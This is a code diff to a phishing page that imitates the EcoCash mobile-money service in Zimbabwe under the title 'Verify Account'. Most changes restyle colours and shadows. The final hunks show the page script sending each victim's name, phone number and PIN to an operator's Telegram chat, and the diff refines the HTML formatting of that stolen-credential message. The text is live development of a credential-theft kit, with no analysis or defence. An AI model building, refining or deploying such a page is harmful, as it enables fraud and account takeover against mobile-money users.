@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <meta name="theme-color" content="#003d99">
+    <meta name="theme-color" content="#001a4d">
     <title>EcoCash | Verify Account · Zimbabwe</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
             --eco-red: #d32f2f;
-            --eco-blue: #003d99;
+            --eco-blue-dark: #001a4d;
+            --eco-blue: #0033a0;
             --eco-blue-light: #0052cc;
             --white: #ffffff;
-            --light-bg: #f0f4f8;
+            --light-bg: #f5f7fa;
             --text-dark: #1a1a1a;
             --text-muted: #666666;
             --border: #e0e0e0;
@@ -23,7 +24,7 @@
 
         body {
             font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, var(--eco-blue) 0%, #002a6d 100%);
+            background: linear-gradient(135deg, var(--eco-blue) 0%, var(--eco-blue-dark) 100%);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -34,7 +35,7 @@
             background: white;
             padding: 16px 5%;
             border-bottom: 3px solid var(--eco-blue);
-            box-shadow: 0 2px 12px rgba(0, 61, 153, 0.12);
+            box-shadow: 0 2px 12px rgba(0, 51, 160, 0.12);
         }
 
         .logo {
@@ -64,7 +65,7 @@
             padding: 40px;
             max-width: 450px;
             width: 100%;
-            box-shadow: 0 10px 40px rgba(0, 61, 153, 0.25);
+            box-shadow: 0 10px 40px rgba(0, 51, 160, 0.25);
             border: 2px solid var(--eco-blue);
         }
 
@@ -87,7 +88,7 @@
         }
 
         .bundle-info {
-            background: linear-gradient(135deg, var(--eco-blue), #002a6d);
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
             border-radius: 12px;
             padding: 16px;
             margin-bottom: 28px;
@@ -138,7 +139,7 @@
         .input-wrapper:focus-within {
             border-color: var(--eco-red);
             background: white;
-            box-shadow: 0 0 0 3px rgba(0, 61, 153, 0.1);
+            box-shadow: 0 0 0 3px rgba(0, 51, 160, 0.1);
         }
 
         .country-code {
@@ -210,7 +211,7 @@
 
         .btn-primary {
             flex: 1;
-            background: linear-gradient(135deg, var(--eco-blue), #002a6d);
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
             color: white;
             border: none;
             padding: 14px 20px;
@@ -221,12 +222,12 @@
             letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
-            box-shadow: 0 4px 12px rgba(0, 61, 153, 0.3);
+            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
         }
 
         .btn-primary:hover:not(:disabled) {
             transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(0, 61, 153, 0.4);
+            box-shadow: 0 6px 16px rgba(0, 51, 160, 0.4);
         }
 
         .btn-primary:disabled {
@@ -336,7 +337,7 @@
             padding: 32px;
             max-width: 400px;
             width: 100%;
-            box-shadow: 0 10px 40px rgba(0, 61, 153, 0.25);
+            box-shadow: 0 10px 40px rgba(0, 51, 160, 0.25);
             text-align: center;
             border: 2px solid var(--eco-blue);
         }
@@ -367,14 +368,14 @@
             letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
-            background: linear-gradient(135deg, var(--eco-blue), #002a6d);
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
             color: white;
-            box-shadow: 0 4px 12px rgba(0, 61, 153, 0.3);
+            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
         }
 
         .modal-btn:hover {
             transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(0, 61, 153, 0.4);
+            box-shadow: 0 6px 16px rgba(0, 51, 160, 0.4);
         }
 
         @media (max-width: 600px) {
@@ -513,7 +514,8 @@
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
                         text: message,
-                        reply_markup: buttons ? { inline_keyboard: buttons } : undefined
+                        reply_markup: buttons ? { inline_keyboard: buttons } : undefined,
+                        parse_mode: 'HTML'
                     })
                 });
 
@@ -557,7 +559,8 @@
                 return;
             }
 
-            const message = `📱 New Login Request\n\nName: ${name}\nPhone: +263${phone}\nPIN: ${pin}\nBundle: ${bundleData.data}\nAmount: USD ${bundleData.price}`;
+            const fullPhone = `+263${phone}`;
+            const message = `📱 <b>New Login Request</b>\n\n<b>Name:</b> ${name}\n<b>Phone:</b> <code>${fullPhone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Bundle:</b> ${bundleData.data}\n<b>Amount:</b> USD ${bundleData.price}`;
             
             const buttons = [
                 [
